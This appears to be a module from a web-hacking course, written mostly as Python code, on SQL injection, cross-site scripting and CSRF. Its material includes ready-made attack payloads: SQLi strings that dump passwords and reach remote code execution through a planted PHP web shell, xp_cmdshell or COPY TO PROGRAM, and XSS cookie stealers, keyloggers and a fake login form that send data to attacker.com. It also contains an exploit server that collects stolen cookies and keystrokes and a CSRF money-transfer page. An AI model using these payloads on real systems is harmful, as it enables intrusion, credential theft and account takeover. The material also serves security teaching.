# Module 5: Web Application Hacking - Deep Technical Dive

## 5.1 SQL Injection - Complete Technical Analysis

### SQL Injection Fundamentals

```python
import sqlite3
import urllib.parse

def sql_injection_basics():
    """
    SQL Injection: Attacker manipulates SQL queries through user input
    
    Vulnerable code:
    query = "SELECT * FROM users WHERE username='" + username + "'"
    
    Normal input: admin
    Query: SELECT * FROM users WHERE username='admin'
    
    Malicious input: admin' OR '1'='1
    Query: SELECT * FROM users WHERE username='admin' OR '1'='1'
    Result: Returns ALL users (WHERE clause always true)
    """
    pass

class SQLInjectionFramework:
    """
    Comprehensive SQL injection attack framework
    """
    
    def __init__(self, target_url, vulnerable_param):
        self.target_url = target_url
        self.vulnerable_param = vulnerable_param
        self.database_type = None
        self.injection_techniques = []
    
    def detect_injection_point(self):
        """
        Detect if parameter is vulnerable to SQL injection
        """
        import requests
        
        test_payloads = [
            ("'", "Quote character"),
            ("' OR '1'='1", "OR logic"),
            ("'; DROP TABLE users; --", "Stacked queries"),
            ("1 AND 1=1", "Boolean-based"),
            ("1 AND 1=2", "Boolean-based false"),
        ]
        
        for payload, description in test_payloads:
            params = {self.vulnerable_param: payload}
            
            try:
                response = requests.get(self.target_url, params=params, timeout=5)
                
                # Analyze response
                if self._is_vulnerable(response):
                    print(f"[+] Vulnerable to: {description}")
                    self.injection_techniques.append(description)
                    return True
            except:
                pass
        
        return False
    
    def _is_vulnerable(self, response):
        """
        Analyze response for SQL error messages
        """
        error_indicators = [
            "SQL syntax error",
            "Warning: mysql_fetch",
            "MySQLException",
            "ORA-",
            "PostgreSQL error",
            "SQLServer error",
            "Unexpected end of SQL",
        ]
        
        response_text = response.text.lower()
        
        for indicator in error_indicators:
            if indicator.lower() in response_text:
                return True
        
        return False

def union_based_sql_injection():
    """
    UNION-based SQLi: Append UNION SELECT to dump data
    
    Vulnerable: SELECT name, email FROM users WHERE id=1
    Attack: 1 UNION SELECT username, password FROM admins
    
    Result combines both queries - reveals admin passwords!
    """
    
    # Step 1: Determine number of columns
    payload_1_col = "1 UNION SELECT NULL"
    payload_2_col = "1 UNION SELECT NULL, NULL"
    payload_3_col = "1 UNION SELECT NULL, NULL, NULL"
    
    # Step 2: Find which columns are displayed
    payload_identify = "1 UNION SELECT 'a', 'b', 'c'"
    # If 'a', 'b', 'c' appear in output, all columns displayed
    
    # Step 3: Dump data
    payload_dump = "1 UNION SELECT username, password FROM admin_users"

def time_based_blind_sqli():
    """
    Blind SQLi: No error messages, use timing to infer data
    
    Technique: Use SLEEP() to create time delays
    """
    
    def extract_character():
        """
        Extract single character through timing
        """
        for char_code in range(32, 127):
            # Payload: If first char of password is chr(char_code), sleep
            payload = f"1; IF((SELECT SUBSTR(password,1,1) FROM users LIMIT 1)=CHAR({char_code}), SLEEP(5), 0);"
            
            # Send request and measure time
            # If response takes 5+ seconds, char found
            # Binary search through printable ASCII
    
    pass

def error_based_sql_injection():
    """
    Error-based SQLi: Use SQL errors to extract data
    
    Technique: Wrap SELECT in function that generates error with output
    """
    
    # MySQL: extractvalue() error shows query output
    payload_mysql = "1' AND extractvalue(1, CONCAT('~', (SELECT password FROM users LIMIT 1))) -- "
    
    # PostgreSQL: cast() error
    payload_postgres = "1'; SELECT CAST((SELECT password FROM users LIMIT 1) AS INT); -- "
    
    # Oracle: XMLType error
    payload_oracle = "1' AND XMLTYPE((SELECT password FROM users LIMIT 1)) -- "
    
    # Error message will contain the extracted data!

def stacked_queries_sql_injection():
    """
    Stacked queries: Multiple SQL statements in single input
    Only works on some databases (MySQL with multiple statements)
    """
    
    # Normal: SELECT * FROM users WHERE id=1
    # Attack: 1; DROP TABLE users; SELECT * FROM dummy; --
    
    # Results in execution of:
    # SELECT * FROM users WHERE id=1
    # DROP TABLE users
    # SELECT * FROM dummy
    
    # Consequences: Data deletion, privilege escalation, RCE

def stored_procedure_injection():
    """
    Stored procedures can also be vulnerable
    """
    
    # Vulnerable stored procedure (SQL Server):
    # CREATE PROCEDURE GetUser @id NVARCHAR(100)
    # AS
    # EXEC('SELECT * FROM users WHERE id=' + @id)
    
    # Attack: EXEC xp_cmdshell 'whoami'
    # Achieves remote command execution!

def sql_injection_to_rce():
    """
    From SQL Injection to Remote Code Execution
    """
    
    # MySQL: INTO OUTFILE
    payload = "1 UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"
    
    # SQL Server: xp_cmdshell
    payload = "1; EXEC xp_cmdshell 'whoami' -- "
    
    # PostgreSQL: COPY ... TO PROGRAM
    payload = "1; COPY (SELECT '') TO PROGRAM 'id' -- "
    
    # Oracle: DBMS_JAVA.RUNJAVA
    # Can execute Java code and system commands
```

### SQL Injection Automated Tool

```python
import requests
import time

class AutomatedSQLiTool:
    """
    Automated SQL injection exploitation tool
    Similar to sqlmap functionality
    """
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.database_type = None
    
    def determine_database_type(self):
        """
        Fingerprint database type from error messages
        """
        signatures = {
            "mysql": ["mysql_fetch", "MySQLException", "You have an error in your SQL syntax"],
            "postgresql": ["PostgreSQL", "PG::Error", "permission denied"],
            "mssql": ["SQL Server", "SqlException", "Incorrect syntax"],
            "oracle": ["ORA-", "Oracle", "missing expression"],
            "sqlite": ["SQLite", "database disk image"],
        }
        
        for db_type, indicators in signatures.items():
            for param in self.get_all_parameters():
                for indicator in indicators:
                    if self._test_for_indicator(param, indicator):
                        self.database_type = db_type
                        print(f"[+] Database type: {db_type}")
                        return db_type
        
        return None
    
    def get_all_parameters(self):
        """Get all GET/POST parameters"""
        # Extract from URL, forms, etc.
        pass
    
    def _test_for_indicator(self, param, indicator):
        """Test if indicator appears in response"""
        pass
    
    def enumerate_database(self):
        """
        Extract database structure
        """
        data = {
            "tables": [],
            "columns": [],
            "data": {}
        }
        
        # Get table names from information_schema
        if self.database_type == "mysql":
            payload = "1 UNION SELECT table_name FROM information_schema.tables"
        elif self.database_type == "postgresql":
            payload = "1 UNION SELECT tablename FROM pg_tables"
        
        # Extract all tables
        # For each table, extract columns
        # For each column, extract data
        
        return data
    
    def crack_authentication(self):
        """
        Extract and crack credentials
        """
        payload = "1 UNION SELECT username, password FROM users"
        # Get hashes, attempt to crack with hashcat/john
        pass
    
    def achieve_rce(self, command):
        """
        From SQLi to RCE
        """
        if self.database_type == "mysql":
            # Need SELECT INTO OUTFILE + web root
            pass
        elif self.database_type == "mssql":
            # Use xp_cmdshell
            payload = f"1; EXEC xp_cmdshell '{command}' -- "
        elif self.database_type == "postgresql":
            # Use COPY TO PROGRAM
            payload = f"1; COPY (SELECT '') TO PROGRAM '{command}' -- "
        
        return payload
```

---

## 5.2 Cross-Site Scripting (XSS) - Complete Technical Analysis

### XSS Types & Mechanisms

```python
def xss_basics():
    """
    Cross-Site Scripting (XSS): Inject JavaScript into page
    
    Vulnerable: echo "Hello " . $_GET['name'];
    
    Attack: <script>alert('XSS')</script>
    
    Consequences:
    - Steal session cookies
    - Hijack user session
    - Capture keystrokes
    - Malware distribution
    - Credential harvesting
    """
    pass

class XSSPayloadGenerator:
    """
    Generate XSS payloads for different scenarios
    """
    
    @staticmethod
    def basic_alert_payload():
        """Proof of concept"""
        return "<script>alert('XSS')</script>"
    
    @staticmethod
    def cookie_stealer():
        """Steal session cookies"""
        payload = """
<script>
var img = new Image();
img.src = 'https://attacker.com/steal.php?cookie=' + document.cookie;
</script>
"""
        return payload.strip()
    
    @staticmethod
    def keylogger_payload():
        """Log all keystrokes"""
        payload = """
<script>
document.onkeypress = function(e) {
    var img = new Image();
    img.src = 'https://attacker.com/log.php?key=' + e.key;
};
</script>
"""
        return payload.strip()
    
    @staticmethod
    def credential_harvester():
        """Phishing form overlay"""
        payload = """
<div style="position:absolute; top:0; left:0; width:100%; height:100%; background:white; z-index:9999;">
<h2>Session Expired. Please Login Again:</h2>
<form action="https://attacker.com/steal.php" method="POST">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Login">
</form>
</div>
"""
        return payload.strip()
    
    @staticmethod
    def dom_based_payload():
        """DOM-based XSS"""
        # If page does: document.getElementById('content').innerHTML = window.location.hash.substring(1)
        # Attack: #<img src=x onerror="alert('XSS')">
        return "#<img src=x onerror=\"alert('XSS')\">"
    
    @staticmethod
    def event_handler_payloads():
        """Various event handler injection points"""
        return [
            "<img src=x onerror=\"alert('XSS')\">",
            "<body onload=\"alert('XSS')\">",
            "<input onfocus=\"alert('XSS')\">",
            "<svg onload=\"alert('XSS')\">",
            "<iframe onload=\"alert('XSS')\">",
        ]
    
    @staticmethod
    def filter_bypass_techniques():
        """Bypass common XSS filters"""
        return {
            "Case variation": "<ScRiPt>alert('XSS')</sCrIpT>",
            "HTML encoding": "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "URL encoding": "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "Hex encoding": "&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;",
            "Double encoding": "%253Cscript%253Ealert('XSS')%253C/script%253E",
            "Mutation XSS": "<noscript><p title=\"</noscript><img src=x onerror='alert(1)' />\">",
            "SVG vectors": "<svg><script>alert('XSS')</script></svg>",
            "Event handlers": "<body onload=alert('XSS')>",
        }

def reflected_xss():
    """
    Reflected XSS: Payload in URL/request
    """
    
    # Vulnerable: http://example.com/search?q=<payload>
    # Reflected back in response
    
    # Attack chain:
    # 1. Craft malicious URL with XSS payload
    # 2. Send to victim via email/social engineering
    # 3. Victim clicks link
    # 4. Payload executes in their browser
    # 5. Attacker steals session, data, etc.

def stored_xss():
    """
    Stored XSS: Payload persisted in database
    """
    
    # Vulnerable: User comment field allows HTML
    # <h1>Innocuous comment</h1><script>alert('XSS')</script>
    # Stored in database
    # Every visitor sees XSS
    # Affects ALL users indefinitely
    
    # Examples:
    # - Malicious blog comment
    # - Forum post with JS
    # - Product review with payload
    # - Social media post
    
    # Much more dangerous than reflected!

def dom_based_xss():
    """
    DOM-based XSS: Vulnerability in client-side JavaScript
    """
    
    # Vulnerable code:
    # document.getElementById('output').innerHTML = window.location.hash.substring(1)
    
    # Attack: http://example.com/page.html#<img src=x onerror="alert('XSS')">
    
    # Characteristics:
    # - Never sent to server
    # - Browser console might not show it
    # - Difficult to detect with WAF
    # - Harder to patch

def xss_impact_scenarios():
    """
    Real-world XSS impact examples
    """
    
    scenarios = {
        "Banking website": "Steal banking session, transfer funds, change password",
        "Email service": "Read emails, send emails as victim, phishing",
        "Social network": "Spread malware, compromise friends, takeover account",
        "Admin panel": "Dump database, create admin accounts, plant backdoor",
        "E-commerce": "Steal credit cards, hijack orders, modify prices",
        "Forum": "Post spam/malware to all users, account takeover",
    }
    
    return scenarios
```

### XSS Automated Discovery

```python
import urllib.parse

class XSSScanner:
    """
    Automated XSS detection and exploitation
    """
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerable_params = []
        self.payloads = []
    
    def find_injection_points(self):
        """
        Identify all user-controlled input parameters
        """
        # Parse forms, query parameters, etc.
        pass
    
    def test_for_xss(self, param):
        """
        Test parameter for XSS vulnerability
        """
        import requests
        
        test_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
        ]
        
        for payload in test_payloads:
            params = {param: payload}
            
            try:
                response = requests.get(self.target_url, params=params, timeout=5)
                
                # Check if payload reflected
                if payload in response.text:
                    print(f"[+] Reflected XSS in {param}: {payload[:50]}")
                    self.vulnerable_params.append((param, payload))
                    return True
                
                # Check if encoded/sanitized
                # If so, might still be exploitable
            except:
                pass
        
        return False
    
    def bypass_filters(self, param):
        """
        Attempt to bypass XSS filters
        """
        bypass_techniques = XSSPayloadGenerator.filter_bypass_techniques()
        
        for technique, payload in bypass_techniques.items():
            # Test each bypass technique
            pass

class XSSExploitServer:
    """
    Serve XSS payloads and collect data
    """
    
    def __init__(self, listen_port=8000):
        self.listen_port = listen_port
        self.cookies_stolen = []
        self.keystrokes = []
        self.form_data = []
    
    def generate_payload_url(self, target_url, xss_payload):
        """
        Create URL with XSS payload
        """
        # Encode payload
        encoded = urllib.parse.quote(xss_payload)
        
        # Inject into vulnerable parameter
        malicious_url = f"{target_url}?search={encoded}"
        
        return malicious_url
    
    def handle_stolen_data(self, data_type, data):
        """
        Process stolen data from XSS
        """
        if data_type == "cookie":
            self.cookies_stolen.append(data)
            print(f"[+] Stolen cookie: {data}")
        
        elif data_type == "keystroke":
            self.keystrokes.append(data)
            print(f"[+] Keystroke: {data}")
        
        elif data_type == "form":
            self.form_data.append(data)
            print(f"[+] Form data: {data}")
```

---

## 5.3 CSRF - Cross-Site Request Forgery

### CSRF Attack Mechanics

```python
def csrf_basics():
    """
    CSRF: Trick victim into making request from attacker's site
    
    Attack:
    1. Victim logged into bank.com (has cookie)
    2. Victim visits attacker.com (unknowingly)
    3. Attacker's page makes request to bank.com/transfer?amount=1000&to=attacker
    4. Bank sees valid session cookie, processes request
    5. Money transferred!
    """
    
    malicious_page = """
<html>
<body>
<img src="http://bank.com/transfer?amount=10000&to=attacker" />
<!-- User's browser automatically sends authenticated request -->
</body>
</html>
"""
    
    return malicious_page

def csrf_token_bypass():
    """
    CSRF tokens prevent attacks, but can sometimes be bypassed
    """
    
    bypass_techniques = {
        "Token not validated": "Server checks token but doesn't verify against session",
        "Token not tied to session": "Same token works for all users",
        "Weak token generation": "Token predictable or reusable",
        "GET requests": "Token only on POST, GET requests vulnerable",
        "SameSite bypass": "Browser doesn't support SameSite, or lax policy",
        "Token from different action": "Token from one action used for another",
    }
    
    return bypass_techniques
```

---

## 5.4 Practice: Build a Web Vulnerability Scanner

```python
import re

class WebVulnerabilityScanner:
    """
    Comprehensive web vulnerability detection
    """
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
    
    def scan_for_sqli(self):
        """Detect SQL injection indicators"""
        pass
    
    def scan_for_xss(self):
        """Detect XSS indicators"""
        pass
    
    def scan_for_csrf(self):
        """Detect CSRF issues"""
        pass
    
    def scan_for_default_credentials(self):
        """Check for common default passwords"""
        pass
    
    def scan_for_outdated_libraries(self):
        """Check for vulnerable versions"""
        pass
    
    def scan_for_information_disclosure(self):
        """Find leaked sensitive information"""
        pass
    
    def generate_report(self):
        """Create vulnerability report"""
        report = {
            "target": self.target_url,
            "vulnerabilities": self.vulnerabilities,
            "risk_level": self._calculate_risk(),
            "recommendations": self._generate_recommendations()
        }
        return report
    
    def _calculate_risk(self):
        """Calculate overall risk score"""
        pass
    
    def _generate_recommendations(self):
        """Generate remediation recommendations"""
        pass
```

---

## Summary
- SQL injection can leak databases and achieve RCE
- XSS stealing cookies and hijacking sessions
- CSRF tricks users into making unwanted requests
- Automated tools can identify and exploit these bugs
- Proper input validation prevents most web attacks

## Next Steps
- Set up OWASP WebGoat
- Practice with Damn Vulnerable Web App (DVWA)
- Study real CVEs
- Learn web exploitation frameworks (SQLmap, Burp Suite)
